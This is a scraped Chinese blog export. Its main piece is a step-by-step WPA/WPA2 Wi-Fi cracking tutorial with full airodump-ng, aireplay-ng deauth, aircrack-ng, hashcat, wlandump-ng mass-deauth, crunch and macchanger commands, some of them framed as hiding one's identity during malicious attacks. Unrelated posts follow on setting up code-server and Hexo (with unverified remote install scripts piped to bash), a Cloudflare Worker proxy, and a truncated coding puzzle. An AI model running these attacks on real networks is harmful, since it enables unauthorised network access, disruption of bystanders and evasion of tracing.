00:23:69:AD:AF:94 -82 350 4 0 1 54e WPA2 CCMP PSK Kaitlin\u0026#39;s Awesome 06:26:BB:75:ED:69 -84 232 0 0 1 54e. WPA2 CCMP PSK HH2 78:71:9C:99:67:D0 -82 339 0 0 1 54e. WPA2 CCMP PSK ARRIS-67D2 9C:34:26:9F:2E:E8 -85 40 0 0 1 54e. WPA2 CCMP PSK Comcast_2EEA-EXT BC:EE:7B:8F:48:28 -85 119 10 0 1 54e WPA2 CCMP PSK root EC:1A:59:36:AD:CA -86 210 28 0 1 54e WPA2 CCMP PSK belkin.dca 出于这个演示的目的，我们将会破解我自己的网络，\u0026ldquo;hackme\u0026rdquo;。记住利用 airodump-ng 展示的 BSSID， MAC 地址以及信道（CH）号，在下一个步骤中我们将会需要它们。\n捕获 4-way Handshake # WPA/WPA2 使用 4-way Handshake 来认证设备连接网络。你不需要明白这些的含意，但是你必须抓取 handshake 才能破解网络密码。这些握手发生在设备连接网络的时候，比如，当你的邻居工作回家的时候。我们通过之前命令发现的信道以及 bssid 值来使用 airmon-ng 来监视目标网络。\n# 将 -c 以及 --bssid 值替换为你的目标网络值 # -w 用来指定我们保存捕获到数据包的文件夹 airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0 CH 6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ] BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 9C:5C:8E:C9:AB:C0 -47 0 140 0 0 6 54e WPA2 CCMP PSK ASUS 现在让我们等一会儿\u0026hellip; 当我们捕捉到一个握手时，你应该能够马上在屏幕的右上角看到类似于[ WPA handshake: bc:d3:c9:ef:d2:67的一些东西。\n如果你不想等，也不反感进行一次主动攻击，你可以强制设备连接到目标网络来重新连接，并且在目标网络中发送恶意 deauthentication 数据包。通常这样就可以抓到 4-way handshake 了。参考下面的 deauth 攻击章节 来获取关于此的信息。\n一旦你捕获了一个握手，按下 ctrl-c 来终止 airodump-ng。这是在你指定的 airodump-ng 输出目录下，应该看到一个用来保存捕获信息的.cap文件（比如叫做-01.cap）。我们将会使用这个捕获文件来破解网络密码。个人喜欢将这个文件重命名为当前正在尝试破解的网络名称：\nmv ./-01.cap hackme.cap 破解网络密码 # 最后一个步骤是使用捕获的 handshake 数据来破解密码。如果你能够访问 GPU，我强烈建议你使用 hashcat 来破解密码。我已经创建了一个叫做 naive-hashcat 的简单工具可以让使用 hashcat 变得非常方便。如果你不能够访问 GPU，还有很多在线的 GPU 破解服务可以使用，比如 GPUHASH.me 或者 OnlineHashCrack 。你也可以常使用 Aircrack-ng 来进行 CPU 破解。\n注意下面的攻击方法都假设用户正在使用弱密码。现如今很多 WPA/WPA2 路由自带 12 位强随机密码，大部分用户都不会去更改。如果你去尝试破解这些密码，我建议你使用 Probable-Wordlists WPA-length 字典文件。\n使用 naive-hashcat 破解（推荐） # 在我们使用 naive-hashcat 破解密码之前，我们需要将我们的 .cap 文件转换成同等 hashcat 文件格式 .hccapx。你可以通过上传 .cap 文件到 https://hashcat.net/cap2hccapx/ 或者直接使用 cap2hccapx 工具。\ncap2hccapx.bin hackme.cap hackme.hccapx 接着，下载并运行 naive-hashcat：\n# 下载 git clone https://github.com/brannondorsey/naive-hashcat cd naive-hashcat # 下载 134MB rockyou 字典文件 curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt # 破解！宝贝！破解！ # 2500 是 hashcat 对于 WPA/WPA2 的哈希模式 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh Naive-hashcat 使用多种字典，规则，组合以及伪装（聪明的暴力）攻击，并且它需要花费数天甚至数月来破解中等长度的密码。破解的密码将会保存到 hackme.pot，因此不时要检查这个文件。一旦你破解这个密码，你将会在你的 POI_FILE 看到类似于下面的内容：\ne30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet 最后两块被 : 分隔开来，分别是网络名称和密码。\n如果你想直接使用 hashcat 而不是 naive-hashcat 的话请参考这个页面。\n利用 Aircrack-ng 破解 # Aircrack-ng 可以用于在你的 CPU 上运行来进行非常基本的字典攻击。在你运行攻击之前，你需要一个单词表。我推荐使用非常著名的 rockyou 字典文件：\n# 下载 134MB rockyou 字典文件 curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 注意，如果网络密码不再这个单词文件话，你将不能破解密码。\n# -a2 指定 WPA2，-b 是 BSSID，-w 是字典文件 aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap 如果密码被破解了，你将会在终端看到一个 KEY FOUND! 消息，后面跟着的文本就是网络密码。\nAircrack-ng 1.2 beta3 [00:01:49] 111040 keys tested (1017.96 k/s) KEY FOUND! [ hacktheplanet ] Master Key : A1 90 16 62 6C B3 E2 DB BB D1 79 CB 75 D2 C7 89 59 4A C9 04 67 10 66 C5 97 83 7B C3 DA 6C 29 2E Transient Key : CB 5A F8 CE 62 B2 1B F7 6F 50 C0 25 62 E9 5D 71 2F 1A 26 34 DD 9F 61 F7 68 85 CC BC 0F 88 88 73 6F CB 3F CC 06 0C 06 08 ED DF EC 3C D3 42 5D 78 8D EC 0C EA D2 BC 8A E2 D7 D3 A2 7F 9F 1A D3 21 EAPOL HMAC : 9F C6 51 57 D3 FA 99 11 9D 17 12 BA B6 DB 06 B4 Deauth Attack # Deauth 攻击会将伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端。 这些数据包包括伪造的 “发件人” 地址，使得它们像客户端那样从接入点本身发送出去。 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接，如果您正在使用airodump-ng进行侦听，就能捕获到 4-way handshake。\n使用 airodump-ng 监视特定接入点（使用 -c channel --bssid MAC），直到看到客户端（STATION）连接。 连接的客户端看起来像这样，64：BC：0C：48：97：F7 是客户端 MAC。\nCH 6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ] BSSID PWR RXQ Beacons #Data, #/s CH MB ENC CIPHER AUTH ESSID 9C:5C:8E:C9:AB:C0 -19 75 1043 144 10 6 54e WPA2 CCMP PSK ASUS BSSID STATION PWR Rate Lost Frames Probe 9C:5C:8E:C9:AB:C0 64:BC:0C:48:97:F7 -37 1e- 1e 4 6479 ASUS 现在，先不管这个正在运行的 airodump-ng ，打开一个新的终端。 我们用 aireplay-ng 命令向我们的受害者客户端发送伪造的解除认证数据包，强制其重新连接到网络，以便在此过程中抓取 handshake。\n# -0 2 指定了我们将发送 2 个解除认证的数据包。如果需要 # 可以增加这个数字，但随之而来客户端网络可能中断，有被人注意到的风险。 # -a 是接入点的 MAC # -c 是客户端的 MAC aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0 你也可以选择得通过广播解除认证数据包到所有连接的客户端：\n# 尽管不是所有的客户端都会响应广播解除认证 aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0 发送了解除认证数据包后，回到你的 airodump-ng 进程，运气好的话你现在应该看到右上角：[WPA握手：9C：5C：8E：C9：AB：C0。 现在你已经捕获了握手，你应该准备好破解网络密码。\n命令列表 # 下面列出了破解 WPA/WPA2 网络所需的所有命令，以最少的解释为依据。\n# 将你的设备设置成监测模式 airmon-ng start wlan0 # 监听附近所有的 beacon 帧来获取目标 BSSID 以及信道 airodump-ng mon0 # 开始监听握手 airodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0 # 选择性的对于连接的设备进行解除验证从而强制握手 aireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0 ########## 利用 aircrack-ng 破解密码... ########## # 如果需要的话下载 134MB 的 rockyou.txt 字典文件 curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt # 利用 w/ aircrack-ng 破解 aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap ########## 或者利用 naive-hashcat 破解密码 ########## # 将 cap 转换成 hccapx cap2hccapx.bin capture/-01.cap capture/-01.hccapx # 利用 naive-hashcat 破解 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh 附录 # 非常欢迎对这篇教程进行回复，我已经添加了社区成员的建议和附加资料作为附录。它包括：\n在 MacOS/OSX 上捕获握手并且破解 WPA 密码 利用 wlandump-ng 捕获从你周围每个网络捕获握手 使用 crunch 即时生成 100+GB 的单词列表 利用 macchanger 伪造你的 MAC 地址 现在也提供中文版本附录。\n致谢 # 这里提供的大部分信息都是从 Lewis Encarnacion 的绝妙的教程 中收集的。 感谢在 Aircrack-ng 和 Hashcat 上工作的优秀作者和维护者。\n非常感谢 neal1991 将本教程翻译成中文。另外也感谢 hiteshnayak305，enilfodne， DrinkMoreCodeMore，hivie7510，cprogrammer1994，0XE4，hartzell，zeeshanu，flennic，bhusang，tversteeg，gpetrousov，crowchirp 和 Shark0der，他们也在 Reddit 和 GitHub 上提供建议或帮助完善这篇文章。如果您有兴趣听取 WPA2 的一些建议替代方案，请参考 Hacker News 的一些重要讨论。\n附录 A # 在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：\n在 MacOS/OSX 上破解 WI-FI 利用 wlandump-ng 抓取 handshake 利用 crunch 生成单词列表 利用 macchanger 保护你的身份 在 MacOS/OSX 上破解 WI-FI # 非常感谢 @harshpatel991 提供本指南。下面会介绍如何使用 MacOS/OSX 自带的工具抓取 4-way handshake，然后再通过 naive-hashcat 来找出一个 WPA/WPA2 无线网络的密码。 此方法已在 OSX 10.10 和 10.12 上进行测试，不过也可能适用于其他版本。 像主教程一样，我们假设你有一个支持 监测模式 的无线网卡。我们在 2012 年上半年和 2015 年中期这两款 MacBook Pro 上进行了测试，并取得了巨大的成功。\n无线诊断工具 # 幸运的是，OSX 配备了一套无线诊断工具。 要打开它们，请在按住键盘上 option 键的同时，点击菜单栏中的 Wi-Fi 图标。 然后选择“打开无线诊断\u0026hellip;”\n测定目标网络信道 # 打开无线诊断程序，单击窗口 \u0026gt; 扫描。 找到目标网络，记录下其信道和宽度。\n抓取一个 4-way handshake # 在无线诊断程序打开的情况下，点击菜单栏中的窗口 \u0026gt; 嗅探器。选择你在上一步中找到的信道和宽度。 现在，你需要等待有设备连接到目标网络。如果你正在自己的网络上测试（使用者应当只在自己的网络上进行测试），将任意一个无线设备重新连接就可以抓取 handshake。 当你感觉已经成功抓取 handshake 时，点击停止。 根据你的操作系统版本，抓取的 .wcap 文件将被保存到桌面或/var/tmp/。 将抓取的文件上传到 https://hashcat.net/cap2hccapx/ 就可以将其转换为 .hccapx 文件。 如果你成功的抓到了 handshake ，站点将开始下载一个.hccapx文件。 否则将不会提示下载。 利用 naive-hashcat 破解密码 # # 克隆 naive-hashcat git clone https://github.com/brannondorsey/naive-hashcat cd naive-hashcat # 在 MacOS/OSX 上从原代码构建程序 ./build-hashcat-osx.sh # 下载 134MB rockyou字典文件 curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 最后，运行 naive-hashcat.sh。将 handshake.hccapx 名称改成你从 hashcat.net 下载的文件名称。cracked.pot是输出文件名称。\nHASH_FILE=handshake.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh 再次感谢 @harshpatel991，以及 phillips321 关于如何在 OSX 上构建 hashcat 的帖子。\n使用 wlandump-ng 抓取 handshake # @enilfodne 提到 hachcat 社区有一个更棒的工具可以抓取 WPA 的 4-way handshakes。它是 hashcat 工具包的一部分，叫 hcxtools ，由 ZerBea 开发，名声已经超过了 airdump-ng。wlandump-ng 允许你一次性从每个附近的网络上全面抓取 handshake 信息，跳过 Wi-Fi 信道，以增加收集。\n# 克隆 hcxtools git clone https://github.com/ZerBea/hcxtools cd hcxtools # 构建并且安装 # 你将可能需要apt来安装需要的依赖 # https://github.com/ZerBea/hcxtools#requirements make sudo make install # 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接 # 将wlan0替换成你的无线设备名称 wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 # 一旦你获得了抓取的文件，你可以利用以下命令将其转换成hashcat抓取格式 cap2hccapx.bin capture.cap capture.hccapx wlandump-ng 命令行参数（使用 h 标志来获得完整列表）：\n-c 1：从通道 1 开始的 2.4Ghz 范围（将转到 13） -t 60：每个通道停留 60s（实验值较低，默认值为 5） -d 100：发送 deauth 每 100 个信标帧 -D 10：每隔 10 个信标帧发送解析数据包 -m 512：内部缓冲区大小，对于低资源机器使用 512 -b：激活信号到最后 10 个探测请求 -r：如果循环在通道 1 上，则重置 deauthentication / detachosciation 计数器 -s 20：显示 20 条状态行 警告： 在大多数地方使用这个是不合法的。更多信息请参考这里。\nwlandump-ng 也提供了在被动模式下运行的选项，这时不会发送任何 deauth/disassociation 数据帧。 如果担心会影响到周围人使用网络（你应该是）时建议你使用这种模式。代价是你获得的 handshake 会少得多，不过用这种方法抓取不会被人察觉。\n# 在被动模式下使用默认设置运行 wlandump-ng -i wlan0 -o capture.cap -p -s 20 使用 crunch 生成单词列表 # crunch 是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用 crunch 来即时生成密码列表，再通过管道传递给 aircrack-ng 而不必将单词列表保存到磁盘。\n# 安装crunch sudo apt-get install crunch 要想知道如何运行 crunch，可以从命令行运行（一旦开始发送密码，就可以按 ctrl-c）：\n# 语法 8 8 是生成密码的最小长度和最大长度 # 01234567890 是组合/排列构成密码的一组字符 crunch 8 8 0123456789 Crunch 现在将生成以下数据量：900000000字节 858 MB 0 GB 0 TB 0 PB Crunch 现在将生成以下行数：100000000 00000000 00000001 00000002 00000003 00000004 00000005 00000006 00000007 00000008 00000009 ... 99999999 我们可以将 crunch 的输出作为 aircrack-ng 的输入，使用它生成的密码作为我们的单词列表。 这里我们使用 crunch 特殊规则字符 % 来表示数字。 此命令尝试破解 10 位电话号码的 WPA 密码（使用 crunch 即时生成的 102GB 的号码）：\n# 我们也可以使用 -t \u0026#34;@^%,\u0026#34; 使用模式 \u0026#39;@\u0026#39; 替换小写 \u0026#39;,\u0026#39; － 替换大写 # \u0026#39;%\u0026#39; －替换数字以及 \u0026#39;^\u0026#39; － 替换特殊字符 # *************** 不要忘记最后的 \u0026#39;-\u0026#39; crunch 10 10 -t \u0026#34;%%%%%%%%%%\u0026#34; | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w - 利用 macchanger 保护你的个人信息 # 每当您使用 Wi-Fi 进行任何远程恶意攻击时，最好将你 Wi-Fi 设备的 MAC 地址进行伪装，避免被人通过网络流量里的设备信息找到你。\n这是利用 macchanger 的一个小尝试：\n# 下载 MAC changer sudo apt-get install macchanger # 关闭设备 sudo ifconfig wlan0 down # 改变 mac # -A 为有效的供应商分配一个随机的MAC w/a # -r 让它真正随机 # -p 将其恢复到原始的硬件MAC sudo macchanger -A wlan0 # 启动设备 sudo ifconfig wlan0 up 如果你有多张无线网卡，最好把所有的设备都改一遍。 或者当你尝试抓取 handshake 时干脆把不用的设备都关掉，尽可能少地留下痕迹。 请注意，重启后伪装的设备信息会恢复。\n","date":"2020年1月24日","externalUrl":null,"permalink":"/posts/wifi-cracking/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eWi-Fi 破解 \n    \u003cdiv id=\"wi-fi-%E7%A0%B4%E8%A7%A3\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#wi-fi-%E7%A0%B4%E8%A7%A3\" aria-label=\"锚点\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cp\u003e利用 Airodump-ng 以及 \u003ca href=\"http://aircrack-ng.org/\" target=\"_blank\"\u003eAircrack-ng\u003c/a\u003e / \u003ca href=\"http://hashcat.net/\" target=\"_blank\"\u003eHashcat\u003c/a\u003e 破解 WPA/WPA2 WI-FI 路由器。\u003c/p\u003e","title":"Wi-Fi 等无线网络安全审计方法","type":"posts"},{"content":"","date":"2020年1月24日","externalUrl":null,"permalink":"/categories/%E5%AE%89%E5%85%A8/","section":"Categories","summary":"","title":"安全","type":"categories"},{"content":"","date":"2020年1月24日","externalUrl":null,"permalink":"/tags/%E5%AE%89%E5%85%A8/","section":"Tags","summary":"","title":"安全","type":"tags"},{"content":"","date":"2020年1月24日","externalUrl":null,"permalink":"/tags/%E7%A0%B4%E8%A7%A3/","section":"Tags","summary":"","title":"破解","type":"tags"},{"content":"⚠ 本教程需要服务器（VPS），Serverless 版本正在探索，请大家耐心等待\n前言 # 我今年五月参加的微信小程序开发赛获得了全国三等奖，微信赠了我 1k 的优惠券 不过这个优惠券只能购买没有优惠过的服务器，所以 1k 优惠券也是了了，最后在我的精打细算下，买了一年零三个月的服务器。买来不能闲置着不用啊，于是我准备构建一个在线写 hexo 的平台，这样就可以摆脱平台的束缚，在任意环境下都可以进行写作了。由于这个服务器是新购置的，所以我从零开始写一下相关的内容。\n配置相关环境 # Nignx(Nginx 比较麻烦，下面更新 caddy 的) # 配置 Nignx 是关键，虽然很俗，但是这个活不能不干。其实也可以有很多选择，比如 Caddy，Apache（这年头个人搭建网站还有人用 Apache 吗，配置巨麻烦）\nDebian apt 自带的 Nginx 太老，可以通过更新源的方式来解决\necho deb http://nginx.org/packages/debian/ stretch nginx | sudo tee /etc/apt/sources.list.d/nginx.list wget http://nginx.org/keys/nginx_signing.key \u0026amp;\u0026amp; sudo apt-key add nginx_signing.key sudo apt update \u0026amp;\u0026amp; apt install nginx -y 到这一部分就完成了最新稳定版的 Nginx 的安装。需要注意的是，这一步安装的 Nginx 和系统自带的 Nginx 的配置目录略有区别，可以用一下几个简单的命令修正：\nsudo mkdir /etc/nginx/{sites-available,sites-enabled} sudo mv /etc/nginx/conf.d/* /etc/nginx/sites-available sudo rmdir -f /etc/nginx/conf.d/ sudo perl -pi -e \u0026#39;s/conf.d/sites-enabled/g\u0026#39; /etc/nginx/nginx.conf 当然这个没必要，我就没弄\n最后出现这个就是成功了 Caddy # Caddy是一个极简的HTTP服务器，支持HTTP/2静态网页服务器，安装也很快，在很多方面都可以不用安装时间很长的lnmp，lamp环境了，配置文件也很简单，同时还有一些有趣的扩展，可以非常方便的搭建一个HTTP服务器。\n可以直接用下面的脚本进行安装，国内主机安装较慢，耐心等一下就好了\n系统要求：CentOS 6+/Debian 6+/Ubuntu 14.04 +。\n本脚本只是一个一键安装+运行控制的脚本，没有其他管理虚拟主机等功能。\n执行下面的代码安装Caddy，如果想要安装其他扩展可以把名字加到命令后面（bash caddy_install.sh install xxx,xxx,xxx，扩展列表点击查看）。\nwget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/caddy_install.sh \u0026amp;\u0026amp; chmod +x caddy_install.sh \u0026amp;\u0026amp; bash caddy_install.sh #备用地址 wget -N --no-check-certificate https://gwliang.com/caddy_install.sh \u0026amp;\u0026amp; chmod +x caddy_install.sh \u0026amp;\u0026amp; bash caddy_install.sh 使用说明 # 启动：/etc/init.d/caddy start 停止：/etc/init.d/caddy stop 重启：/etc/init.d/caddy restart 查看状态：/etc/init.d/caddy status 查看Caddy启动日志：tail -f /tmp/caddy.log 安装目录：/usr/local/caddy Caddy配置文件位置：/usr/local/caddy/Caddyfile Caddy自动申请SSL证书位置：/.caddy/acme/acme-v01.api.letsencrypt.org/sites/xxx.xxx(域名)/ 等会会教大家如何配置\nNodeJS # NodeJS 是最重要的，没有 Nginx 也得有 NodeJS，这是我们写博客的关键，Debian 自带的 NodeJS 还是比较老的，推荐用 nvm 安装\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.1/install.sh | bash 然后关闭再打开终端，就可以用了\n我目前 NodeJS 最新版是 12.13.0，输入\nnvm install 12.13.0 就安装了 NodeJS 12.13.0 版本\ngit # git 直接用 apt 安装就行了，这个不再赘述。\napt install git 工作区配置 # 把你的博客源文件上传 Github # 为了多端同步，也为了防止服务器不好上传你的文件，这个时候就需要将你的博客的源文件文件上传到 GitHub，由于 Hexo 会吃掉你博客的 master 分支，这个时候就需要先创建一个分支。在你博客源文件的文件夹下打开 Git bash，输入下面的命令\ngit checkout -b inside 这样就创建了一个 inside 分支，因为我这个博客的主题就是 inside。然后git push到 GitHub 上，本地这边的工作就完成了。\n在服务器上把你的源代码 clone 下来 # 由于服务器是全新的，我就按全新的来说，首先输入下面命令：\ngit config --global user.name \u0026#34;你GitHub的用户名\u0026#34; git config --global user.email \u0026#34;你GitHub注册时用的邮箱\u0026#34; ssh-keygen -t rsa -C \u0026#34;你GitHub注册时用的邮箱\u0026#34; 默认回车即可，然后输入cat /root/.ssh/id_rsa.pub，然后把输出的东西整个复制出来 打开github，在头像下面点击settings，再点击SSH and GPG keys，新建一个 SSH，Title 随便。\n把刚才输出的一串复制到 key 里即可\n输入ssh -T git@github.com，问 Are you sure you want to continue connecting (yes/no)?时输入 yes，如果出现你的用户名，那就成功了。\n然后在服务器上 clone 一下你新建的分支，通过-b选择分支，例如\ngit clone -b inside https://github.com/gaowanliang/gaowanliang.github.io.git (要按照自己的实际情况来)\n安装 Code-server # 众所周知，Visual Studio Code 是基于 Electron 的，而 Electron 又是一个“双头怪”——基于 Web 技术的桌面应用平台。但在最近，Coder 的开发者最近做了有趣的尝试，让我们可以把整个 VSCode 放到浏览器中去运行。而 VSCode 写 markdown 的体验也是很舒服的，为了不用自己写一个网页来搞一些复杂的配置，直接用浏览器版的 Vscode 就很舒服，而且还能应急改其他代码，那我们就简单配置一下。\n首先在下列网址下载最新版 code-server\nhttps://github.com/cdr/code-server/releases\n下载好后上传到你的服务器，或者直接用 wget 下载。之后 cd 到下载目录，执行下面的代码\ntar -C /opt -xzvf code-server-xxx.tar.gz // 根据具体的名字来解压 cd /opt mv code-server*4 code-server cd code-server ./code-server 然后就会出现这样的场景，证明你的服务器可以用，但是不能保证正确运行，还得测试一下\n按下 Ctrl+C 停止服务，接着执行下面的命令\n./code-server --host 0.0.0.0 --port 9900 之后打开你的 IP:9900，如果出现需要你输入密码的界面，说明没啥问题，密码如果你没配置过，会显示在服务器控制台里。(如果是部分服务商，需要在后台开放端口)\n输入密码，进入界面，第一次进入要等很久\n和 VSCode 几乎一模一样，有内味了。由于这个 code-server 是完全独立于系统的，所以你需要重新安装一下 nodejs。当然在安装之前，要先安装一下中文汉化包。由于这个自带的插件商店是残废版，很多插件都没有，需要你自己去下载离线版.vsix 安装，安装之前，需要看一下 VSCode 的版本，点击左上角的三个横杠-Help-About，可以看到 version 显示的版本，我这里是 1.42.0，然后去商店下载离线汉化包，进入 https://marketplace.visualstudio.com/ ，搜索 Chinese，然后会出来 Chinese (Simplified) Language Pack for Visual Studio Code 这个，点进去，找到右边的 Download Extension，点一下，获取一下下载连接，我获取到的下载链接是 https://marketplace.visualstudio.com/_apis/public/gallery/publishers/MS-CEINTL/vsextensions/vscode-language-pack-zh-hans/1.43.9/vspackage 可以看到最新版本已经是 1.43.9 了，我们把下载链接里的那个版本号改成适用于你 VSCode 的版本号，比如我就是 1.42.0，所以下载链接就改成 https://marketplace.visualstudio.com/_apis/public/gallery/publishers/MS-CEINTL/vsextensions/vscode-language-pack-zh-hans/1.42.0/vspackage 。下载好后，传到服务器里\n回到网页，打开插件列表，选 Install VSIX\n找到上传的地址，安装即可 之后点一下右下角的 YES 即可，之后等待刷新完成，就是中文了 按下 Ctrl+J，打开终端，第一次打开要选一下默认终端的类型，按照图中的方法操作，最后在弹出的框中选择 Bash 即可。\n之后按照上面的操作，在这个终端里安装一下 nodejs 和导入一下 GitHub 的信息，只不过不用再生成 SSH 密钥了（ssh-keygen和cat这两个命令不用了，也不用导入密钥了），但是 git config 命令要改成这样\ngit config --system user.name \u0026#34;你GitHub的用户名\u0026#34; git config --system user.email \u0026#34;你GitHub注册时用的邮箱\u0026#34; 之后选择左上角三个横杠-文件-打开文件夹，打开你 clone 的博客的目录\n之后要在终端里 npm install，由于我是国内服务器，就用 cnpm install 了（要使用 cnpm 的话，要执行一下npm install -g cnpm）\n之后执行一下npm install -g hexo-cli，就可以愉快的使用hexo g \u0026amp;\u0026amp; hexo d 了\n配置 systemctl # 先在服务器终端按下 Ctrl+C 停止服务，然后执行下面的命令\ncat \u0026gt; /etc/systemd/system/code.service \u0026lt;\u0026lt;EOF [Unit] Description=Code Server NO.1 After=network.target [Service] Type=simple EnvironmentFile=/opt/code-server/.envfile WorkingDirectory=/opt/code-server/ Restart=on-failure RestartSec=10 ExecStart=/opt/code-server/code-server --host 0.0.0.0 --port 9900 StandardOutput=file:/opt/code-server/output/output.log StandardError=file:/opt/code-server/error/error.log [Install] WantedBy=multi-user.target EOF 之后要配置一下默认密码，也是执行下面的命令（将 gaowanliang 改成你自己的密码）\nPASSWORD=gaowanliang echo \u0026#34;PASSWORD=\\\u0026#34;${PASSWORD}\\\u0026#34;\u0026#34; \u0026gt; /opt/code-server/.envfile 之后执行下面两条命令，实现后台运行和开机自启\nsystemctl enable code systemctl start code 现在可以直接打开你的 IP:9900，输入你自己设置的密码，这样关闭服务器终端也不会停止了\n配置域名(可选) # 如果你有自己的域名，可以绑上一个域名，就不用每次都输 IP 和端口了，执行下面的命令（将所有 code.gwliang.com 改成你自己的域名） 这里使用的是Caddy\n// 下面两个二者选其一 // 不需要HTTPS echo \u0026#34;http://code.gwliang.com { gzip proxy / 127.0.0.1:9900 }\u0026#34; \u0026gt; /usr/local/caddy/Caddyfile //需要HTTPS，其中 admin@gwliang.com 改成你自己的邮箱 echo \u0026#34;code.gwliang.com { gzip tls admin@gwliang.com proxy / 127.0.0.1:9900 }\u0026#34; \u0026gt; /usr/local/caddy/Caddyfile /etc/init.d/caddy start 打开你自己的域名，就可以正常使用了。\n后记 # 图片的话不太好上传，直接用在线图床即可，推荐两个\n路过图床 https://imgchr.com/\nsm.ms https://sm.ms/\n用 qq 自带的截图，截好之后直接 Ctrl+V 可以直接上传到网页上，然后下面都会给出 Markdown 的引用方式，直接引用即可\n","date":"2019年11月19日","externalUrl":null,"permalink":"/posts/implement-hexo-blog-online-editing-from-scratch/","section":"","summary":"本教程需要服务器（VPS），Serverless版本正在探索，请大家耐心等待","title":"[已过时] 从零开始实现hexo博客的在线编辑","type":"posts"},{"content":"","date":"2019年11月19日","externalUrl":null,"permalink":"/tags/%E5%8D%9A%E5%AE%A2/","section":"Tags","summary":"","title":"博客","type":"tags"},{"content":"","date":"2019年11月4日","externalUrl":null,"permalink":"/tags/cloudflare/","section":"Tags","summary":"","title":"Cloudflare","type":"tags"},{"content":" Cloudflare Worker+jsproxy 实现浏览器代理访问谷歌 # 简介 # CloudFlare Worker 是 CloudFlare 的边缘计算服务。开发者可通过 JavaScript 对 CDN 进行编程，从而能灵活处理 HTTP 请求。这使得很多任务可在 CDN 上完成，无需自己的服务器参与。使用 jsproxy 技术就可以轻松进行前端代理功能，同时没有任何费用。\n部署 # 首页：https://workers.cloudflare.com\n注册，登陆，Start building，取一个子域名，Create a Worker。\n复制 index.js 到左侧代码框，Save and deploy。如果正常，右侧应显示首页。\n收藏地址框中的 https://xxxx.子域名.workers.dev，以后可直接访问。\n我进行了美化，效果图如下：\n计费 # 后退到 overview 页面可参看使用情况。免费版每天有 10 万次免费请求，对于个人通常足够。\n如果不够用，可注册多个 Worker，在 conf.js 中配置多线路负载均衡。或者升级到 $5 的高级版本，每月可用 1000 万次请求（超出部分 $0.5/百万次请求）。\n修改配置 # 默认情况下，静态资源从 https://etherdream.github.io/jsproxy 反向代理，可通过代码中 ASSET_URL 配置，从而可使用自定义的 conf.js 配置。\n存在问题 # WebSocket 代理尚未实现\n外链限制尚未实现\n未充分测试，以后再完善\n","date":"2019年11月4日","externalUrl":null,"permalink":"/posts/cloudflare_worker_jsproxy/","section":"","summary":"CloudFlare 提供了一项很好用的服务 Worker，可以用来实现前端代理功能，jsproxy 是一个基于 Worker 的前端代理工具，可以实现浏览器代理访问其他网站。","title":"Cloudflare Worker + jsproxy实现浏览器代理","type":"posts"},{"content":"","date":"2019年11月4日","externalUrl":null,"permalink":"/tags/jsproxy/","section":"Tags","summary":"","title":"Jsproxy","type":"tags"},{"content":"","date":"2019年11月4日","externalUrl":null,"permalink":"/tags/%E4%BB%A3%E7%90%86/","section":"Tags","summary":"","title":"代理","type":"tags"},{"content":"B 站在牛客网（ https://www.nowcoder.com/test/16519291/summary ） 上发了一套自己秋招的编程题，恰好今年被老师忽悠着去再参加一次蓝桥杯（我参加 C++组，所以下面的题都是用 C++做的，没用我熟悉的 python），虽然那个比赛很水，但是还是要提高我的编程能力才是。于是准备做点题练习下，B 站这个题挺好，题目很新颖（仅限题目描述），不过内容和那个比赛一样水，所以给大家解析下。\n1.扭蛋机 answer # 时间限制：1 秒\n空间限制：32768K\n22 娘和 33 娘接到了小电视君的扭蛋任务： 一共有两台扭蛋机，编号分别为扭蛋机 2 号和扭蛋机 3 号，22 娘使用扭蛋机 2 号，33 娘使用扭蛋机 3 号。 扭蛋机都不需要投币，但有一项特殊能力： 扭蛋机 2 号：如果塞 x（x 范围为\u0026gt;=0 正整数）个扭蛋进去，然后就可以扭到 2x+1 个 扭蛋机 3 号：如果塞 x（x 